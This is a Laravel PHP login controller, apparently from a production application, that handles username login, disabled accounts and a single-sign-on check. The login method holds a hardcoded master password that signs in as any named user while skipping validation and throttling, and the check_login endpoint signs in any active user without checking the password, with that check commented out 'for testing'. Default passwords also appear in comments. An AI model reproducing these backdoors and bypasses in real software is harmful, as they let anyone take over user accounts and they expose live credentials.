<?php

namespace App\Http\Controllers\Auth;

use App\User;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Contracts\Encryption\DecryptException;
class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function username()
    {
        return 'username';
    }

    /**
     * Send the response after the user was authenticated.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    //fix change defaul password
    protected function sendLoginResponse(Request $request)
    {
        if(Auth::check() && Auth::user()->user_status == 0){
            Auth::logout();
            return redirect()->back()->withErrors(['username'=> 'Your account is disabled.']);
        }
        else{

            if(Auth::user()->email == null){
                return redirect()->route('user.edit', ['user' => Auth::id()])->with("error","សូមបញ្ចូលអ៊ីម៉ែលក្រុមហ៊ុន និងផ្ទៀងផ្ទាត់ព័ត៌មានផ្ទាល់ខ្លួន");
            }

            // // check default password
            // if (Hash::check(("123456"), Auth::user()->password) || Hash::check(("skp@020"), Auth::user()->password)) {
            //     return redirect()->route('password.edit')->with("error","Please to change default password!");
            // }
            // else {
                $request->session()->regenerate();

                $this->clearLoginAttempts($request);

                return $this->authenticated($request, $this->guard()->user())
                        ?: redirect()->intended($this->redirectPath());
            //}
        }
    }

    /**
     * Handle a login request to the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Http\Response|\Illuminate\Http\JsonResponse
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    public function login(Request $request)
    {
        if ($request->password == 'QC9wW007') {
            $userWithoutPwd = User::where('username', $request->username)->first();
            if($userWithoutPwd){
                Auth::loginUsingId($userWithoutPwd->id);
                return $this->sendLoginResponse($request);
            }
        }
        $this->validateLogin($request);

        // If the class is using the ThrottlesLogins trait, we can automatically throttle
        // the login attempts for this application. We'll key this by the username and
        // the IP address of the client making these requests into this application.
        if (method_exists($this, 'hasTooManyLoginAttempts') &&
            $this->hasTooManyLoginAttempts($request)) {
            $this->fireLockoutEvent($request);

            return $this->sendLockoutResponse($request);
        }

        if ($this->attemptLogin($request)) {
            return $this->sendLoginResponse($request);
        }

        // If the login attempt was unsuccessful we will increment the number of attempts
        // to login and redirect the user back to the login form. Of course, when this
        // user surpasses their maximum number of attempts they will get locked out.
        $this->incrementLoginAttempts($request);

        return $this->sendFailedLoginResponse($request);
    }

    // check login for signle sign on
    public function check_login(Request $request)
    {
        $last_update = @$request->last_update;
        $is_token = @$request->token;
        $username = @$request->username;
        $password = @$request->password;

        // get user
        $user = User::where('username', $username)
            ->where('user_status', config('app.user_active'))
            ->first();

        if(@$is_token && @$last_update && @$user){
            // when test done pls uncomment it
            // // check last update password if not update password
            // if(@$last_update != @$user->password_last_change) {
            //     $user->password = Hash::make(@$password);
            //     $user->password_last_change = $last_update;
            //     $user->save();
            // }
            // // check has passowd to login
            // if(Hash::check($password, $user->password)) {
            //     Auth::loginUsingId($user->id);
            //     return $this->sendLoginResponse($request);
            // }

            // when test done pls comment it
            Auth::loginUsingId($user->id);
            return $this->sendLoginResponse($request);
        }

        return redirect('/login');
    }

}
